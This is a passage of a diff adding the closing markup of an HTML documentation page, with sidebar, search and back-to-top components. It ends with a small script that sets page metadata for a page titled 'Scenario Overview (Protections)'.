+                    <!-- User should be able to hide sidebar right -->
+                    <doc-sidebar-right v-cloak></doc-sidebar-right>
+                </div>
+
+            </div>
+        </div>
+    
+        <doc-search-mobile></doc-search-mobile>
+        <doc-back-to-top></doc-back-to-top>
+    </div>
+
+
+    <div id="docs-overlay-target"></div>
+
+    <script data-cfasync="false">window.__DOCS__ = { "title": "Scenario Overview (Protections)", level: 4, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
+</body>
+</html>
